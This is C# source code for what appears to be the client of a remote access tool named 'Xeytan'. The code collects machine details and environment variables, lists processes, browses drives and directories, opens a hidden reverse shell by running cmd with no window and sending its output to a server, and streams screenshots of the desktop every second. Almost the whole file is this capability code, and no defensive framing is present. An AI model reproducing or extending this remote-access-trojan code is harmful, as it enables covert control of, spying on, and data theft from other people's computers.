using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using NetLib.Models;
using NetLib.Packets;
using XeytanCSharpClient.Net;
using XeytanCSharpClient.Services;
using FileInfo = NetLib.Models.FileInfo;

namespace XeytanCSharpClient
{
    class XeytanApplication
    {
        public void Start()
        {
            NetClientService = new NetClientService
            {
                Application = this
            };

            NetClientService.Start();
        }

        public NetClientService NetClientService { get; set; }
        public bool IsReverseShellSessionActive { get; set; } = false;
        public bool IsProcessExiting { get; set; } = false;
        public bool IsStreamingDesktop { get; set; } = false;

        public void OnSystemInformationRequested()
        {
            string pcName = Environment.MachineName;
            string userName = Environment.UserName;
            string osVersion = Environment.OSVersion.ToString();
            string dotNetVersion = Environment.Version.ToString();
            // System.Environment.Version.ToString()
            IDictionary envVariables = Environment.GetEnvironmentVariables();

            NetClientService.SendSystemInformation(new SystemInfo
            {
                PcName = pcName, UserName = userName, OperatingSystem = osVersion, DotNetVersion = dotNetVersion,
                EnvironmentVariables = envVariables
            });
        }

        public void OnProcessListRequested()
        {
            Process[] processes = Process.GetProcesses();
            List<NetLib.Models.ProcessInfo> processInfos = new List<NetLib.Models.ProcessInfo>();

            foreach (Process process in processes)
            {
                string processName = process.ProcessName;
                int pid = process.Id;
                ProcessInfo processInfo = new ProcessInfo {ProcessName = processName, Pid = pid};
                processInfos.Add(processInfo);

                try
                {
                    processInfo.FilePath = process.MainModule.FileName;
                }
                catch (Win32Exception exception)
                {
                    // Console.WriteLine(exception.ToString());
                    Console.WriteLine("Error with process {0} ({1})", processName, pid);
                }
                catch (InvalidOperationException exception)
                {
                    Console.WriteLine("Error with process {0} ({1})", processName, pid);
                }
            }

            NetClientService.SendProcessList(processInfos);
        }

        public void OnRootsRequested()
        {
            // Send Roots
            List<DiskDriveInfo> diskDrives = FileSystemService.GetRoots();
            NetClientService.SendFileSystemRoots(diskDrives);
        }

        public void OnListDirRequested(string path)
        {
            FileAttributes attributes = File.GetAttributes(path);
            string error;
            List<NetLib.Models.FileInfo> files = FileSystemService.GetDirectoryPaths(path, out error);

            if (error == null)
            {
                NetClientService.SendFileSystemEntries(path, files);
            }
            else
            {
                Console.WriteLine("Error Retrieving Directory entries {0}", error);
            }
        }

        private Process _process;
        private byte[] BufferOut { get; set; } = new byte[1024];
        private byte[] BufferErr { get; set; } = new byte[1024];

        public void ExecuteShell(string command)
        {
            if (IsReverseShellSessionActive)
            {
                OnInputAvailable(command);
            }
        }

        private void OnInputAvailable(string line)
        {
            line = line.Trim();
            _process.StandardInput.WriteLine(line);
            _process.StandardInput.Flush();
        }


        private void OnOutputAvailable(IAsyncResult ar)
        {
            lock (ar.AsyncState)
            {
                var processStream = ar.AsyncState as StreamReader;

                Debug.Assert(processStream != null, nameof(processStream) + " != null");
                int numberOfBytesRead = processStream.BaseStream.EndRead(ar);

                if (numberOfBytesRead == 0)
                {
                    OnPipeClosed();
                    return;
                }

                string output = Encoding.UTF8.GetString(BufferOut, 0, numberOfBytesRead);


                processStream.BaseStream.BeginRead(BufferOut, 0, BufferOut.Length, OnOutputAvailable, processStream);

                NetClientService.SendPacket(new PacketShell
                {
                    Output = output
                });
            }
        }

        private void OnErrorAvailable(IAsyncResult ar)
        {
            lock (ar.AsyncState)
            {
                var processStream = ar.AsyncState as StreamReader;

                Debug.Assert(processStream != null, nameof(processStream) + " != null");
                int numberOfBytesRead = processStream.BaseStream.EndRead(ar);

                if (numberOfBytesRead == 0)
                {
                    OnPipeClosed();
                    return;
                }

                string output = Encoding.UTF8.GetString(BufferErr, 0, numberOfBytesRead);

                processStream.BaseStream.BeginRead(BufferErr, 0, BufferErr.Length, OnErrorAvailable, processStream);

                NetClientService.SendPacket(new PacketShell
                {
                    Output = output
                });
            }
        }

        private void OnPipeClosed()
        {
            lock (this)
            {
                // This method will be called twice, once for the Output pipe being closed
                // The second when the Error pipe being closed, the first time we want to
                // set IsReverseShellSessionActive to false
                // The second we set also the IsProcessExiting to false
                // This is all done to make sure we only send one PacketShell with Stop to the server
                if (IsReverseShellSessionActive)
                {
                    IsReverseShellSessionActive = false;
                    IsProcessExiting = true;
                    NetClientService.SendPacket(new PacketShell
                    {
                        Action = ServiceAction.Stop
                    });
                }
                else if (IsProcessExiting)
                {
                    IsProcessExiting = false;
                }
            }
        }

        public void StartReverseShellSession()
        {
            _process = new Process();
            _process.StartInfo.FileName = "cmd";
            _process.StartInfo.Arguments = "";
            _process.StartInfo.CreateNoWindow = true;
            _process.StartInfo.UseShellExecute = false;
            _process.StartInfo.RedirectStandardOutput = true;
            _process.StartInfo.RedirectStandardInput = true;
            _process.StartInfo.RedirectStandardError = true;

            _process.Start();

            _process.StandardOutput.BaseStream.BeginRead(BufferOut, 0, BufferOut.Length, OnOutputAvailable,
                _process.StandardOutput);

            _process.StandardError.BaseStream.BeginRead(BufferErr, 0, BufferErr.Length, OnErrorAvailable,
                _process.StandardError);
            IsReverseShellSessionActive = true;
        }


        public void OnDesktopRequest(DesktopAction action)
        {
            if (action == DesktopAction.Start && !IsStreamingDesktop)
            {
                new Thread(this.StreamDesktop).Start();
            }
            else if (action == DesktopAction.Stop && IsStreamingDesktop)
            {
                IsStreamingDesktop = false;
            }
        }

        public void StreamDesktop()
        {
            IsStreamingDesktop = true;
            while (IsStreamingDesktop)
            {
                byte[] imageData = Bitmap2ByteArray(CaptureScreenShot());

                NetClientService.SendDesktopImage(imageData);

                Thread.Sleep(1000);
            }
        }

        public static Bitmap CaptureScreenShot()
        {
            int x = Screen.PrimaryScreen.Bounds.X;
            int y = Screen.PrimaryScreen.Bounds.Y;
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;
            return CaptureScreenShot(x, y, width, height);
        }

        private static Bitmap CaptureScreenShot(int x, int y, int width, int height)
        {
            Bitmap screenShotBmp = new Bitmap(width, height, PixelFormat.Format32bppArgb);

            Graphics screenShotGraphics = Graphics.FromImage(screenShotBmp);

            screenShotGraphics.CopyFromScreen(new Point(x, y), Point.Empty, new Size(width, height),
                CopyPixelOperation.SourceCopy);
            screenShotGraphics.Dispose();

            return screenShotBmp;
        }
        public byte[] Bitmap2ByteArray(Bitmap bitmap)
        {
            MemoryStream memoryStream = new MemoryStream();

            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            // captureBitmap.Save(memoryStream, captureBitmap.RawFormat);

            return memoryStream.ToArray();
        }
    }
}